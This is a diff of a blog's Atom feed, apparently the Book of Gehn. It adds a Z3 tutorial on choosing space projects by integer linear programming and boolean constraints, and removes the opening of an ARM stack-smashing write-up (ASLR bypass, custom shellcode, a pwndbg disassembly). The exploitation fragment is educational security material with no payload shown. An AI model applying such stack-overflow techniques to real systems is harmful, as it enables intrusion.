+  &lt;p&gt;Note: technically &lt;code class=&quot;highlighter-rouge&quot;&gt;push()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pop()&lt;/code&gt; also change what solver can be
+used; a safer alternative could be use &lt;code class=&quot;highlighter-rouge&quot;&gt;Optimize&lt;/code&gt;’s deep copy.
+However, currently in Z3 version &lt;code class=&quot;highlighter-rouge&quot;&gt;4.8.10&lt;/code&gt; it is not supported (a bug
+perhaps?)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;integer-linear-programming&quot;&gt;Integer linear programming&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IntSort&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IntSort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# conflict rule: or P3 or P4 but not both
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# dependency rule: P3 depends on P6
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# dependency rule: P5 depends on P1 and P2
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you see, &lt;code class=&quot;highlighter-rouge&quot;&gt;Bools&lt;/code&gt; cannot be added up or compared by inequality
+directly (how would you interpret &lt;code class=&quot;highlighter-rouge&quot;&gt;True + True&lt;/code&gt;?). Instead we &lt;em&gt;cast them&lt;/em&gt;
+to integers.&lt;/p&gt;
+
+&lt;p&gt;In the other inequalities we didn’t have to because things like
+&lt;code class=&quot;highlighter-rouge&quot;&gt;2 * P[5]&lt;/code&gt; already makes an integer expression; multiplying by 0 or 1
+does not work however.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: currently in Z3 version &lt;code class=&quot;highlighter-rouge&quot;&gt;4.8.10&lt;/code&gt; has a &lt;code class=&quot;highlighter-rouge&quot;&gt;ToInt&lt;/code&gt; function but it
+does not work with &lt;code class=&quot;highlighter-rouge&quot;&gt;Bools&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;BoolRef&lt;/code&gt; objects).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Projects:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;- {P[i]} = {m[P[i]]}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Projects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s see how we can rewrite the inequalities for dependency and
+conflict restrictions.&lt;/p&gt;
+
+&lt;h2 id=&quot;boolean-theory&quot;&gt;Boolean theory&lt;/h2&gt;
+
+&lt;p&gt;First we restore the solver to the point before adding those
+inequalities:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we use &lt;em&gt;boolean expressions&lt;/em&gt; which may make more sense:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;And&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;If&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# conflict rule: P3 and P4 cannot happen
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;And&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# If the dependency P6 is not met, P3 must be False,
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# otherwise whatever P3 is fine
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# If the dependencies P1 and P2 are not met, P5 must be False,
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# otherwise whatever P5 is fine
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;And&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Projects:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;- {P[i]} = {m[P[i]]}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Projects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Z3 has a bunch of boolean expressions/functions that can replace the
+traditional inequalities: &lt;code class=&quot;highlighter-rouge&quot;&gt;If&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;AtMost&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;AtLeast&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Implies&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;And&lt;/code&gt;,
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Or&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Not&lt;/code&gt;.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">A space company is planning the next 4 years. It has several projects, each one with its own budget requirement per year, but the company has a limited budget to invest. Moreover, some projects depends on others to make them feasible and some projects cannot be done if other projects due unbreakable restrictions. Project 1st 2nd 3rd 4th Depends Not Profit 1 Cube-1 nano-sat 1.1 2         12 2 Cube-2 nano-sat   2.5 2       12 3 Infrared sat     1 4.1 on 6 with 4 18 4 Colored img sat     2 8   with 3 15 5 Mars probe   2 8 4.4 on 1 &amp;amp; 2   12 6 Microwave tech 4 2.3 2       1 Under an incredible amount of assumptions and good luck, what is the best strategy to maximize the profit?</summary></entry><entry><title type="html">Blending Whisky with Z3</title><link href="/book-of-gehn/articles/2021/04/29/Blending-Whisky.html" rel="alternate" type="text/html" title="Blending Whisky with Z3" /><published>2021-04-29T00:00:00+02:00</published><updated>2021-04-29T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/04/29/Blending-Whisky</id><content type="html" xml:base="/book-of-gehn/articles/2021/04/29/Blending-Whisky.html">&lt;p&gt;A whisky producer uses three kind of licor to make their whisky: &lt;script type=&quot;math/tex&quot;&gt;A&lt;/script&gt;,
 &lt;script type=&quot;math/tex&quot;&gt;B&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;C&lt;/script&gt;.&lt;/p&gt;
 
 &lt;p&gt;Three kind of whisky can be made using the licor
@@ -1855,323 +2159,4 @@ we were &lt;em&gt;hardcoding&lt;/em&gt; addresses. &lt;em&gt;Shame on me&lt;/em&
 &lt;p&gt;Address Space Layout Randomization &lt;em&gt;(ASLR)&lt;/em&gt; is a well established feature
 of modern OS to randomize the &lt;em&gt;base address&lt;/em&gt; of the loaded libraries.
 Bypassing techniques exist since at least 2007 so it is a definitely
-topic to learn.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">It’s time to solve the last challenge of this 7 part serie.</summary></entry><entry><title type="html">Smashing ARM Stack for Fun - Part VI</title><link href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part VI" /><published>2021-01-26T00:00:00+01:00</published><updated>2021-01-26T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">&lt;p&gt;We have the same vulnerability than we have in
-&lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-V.html&quot;&gt;stack4&lt;/a&gt;
-but this time we will make our own egg/shellcode.&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;same-vuln&quot;&gt;Same vuln&lt;/h2&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
- &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1041c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10420&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
